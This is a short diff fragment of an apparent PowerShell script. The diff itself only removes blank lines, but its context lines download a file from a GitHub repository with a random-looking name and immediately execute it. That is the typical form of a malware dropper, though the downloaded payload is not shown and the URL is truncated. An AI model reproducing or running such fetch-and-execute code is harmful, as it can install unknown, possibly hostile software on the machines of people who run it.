@@ -7,5 +7,3 @@ $url = "https://github.com/ashduasdoasdoasd/rickownens/raw/refs/heads/main/confi
 Invoke-WebRequest -Uri $url -OutFile $filePath
 
 & $filePath
-
-
